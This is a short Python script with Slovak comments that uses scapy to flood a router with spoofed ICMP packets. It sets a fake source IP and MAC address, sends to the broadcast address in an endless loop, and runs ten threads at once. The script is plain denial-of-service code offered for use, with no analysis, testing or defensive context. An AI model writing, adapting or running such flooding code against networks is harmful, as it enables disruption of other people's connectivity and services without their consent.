import threading
import time
from scapy.all import *

def flood_wifi(router_ip, interface):
    # Definovanie falošnej IP adresy a MAC adresy
    fake_ip = "192.168.1.100"
    fake_mac = "00:11:22:33:44:55"
    
    # Vytvorenie falošnej ICMP pakety
    packet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src=fake_ip, dst=router_ip)/ICMP()
    
    # Nekonečný cyklus na odosielanie falošných paketov
    while True:
        sendp(packet, iface=interface, verbose=False)
        time.sleep(0.01)  # Malá pauza medzi odosielaním paketov

# Nastavenie IP adresy routra a názvu bezdrôtového rozhrania
router_ip = "192.168.1.1"  # Tu zadaj IP adresu svojho routera
wifi_interface = "wlan0"  # Tu zadaj názov svojho bezdrôtového rozhrania

# Spustenie zahltenia wifi siete pomocou viacerých vlákien
for _ in range(10):  # Počet vlákien pre zvýšenie zahltenia
    t = threading.Thread(target=flood_wifi, args=(router_ip, wifi_interface))
    t.start()
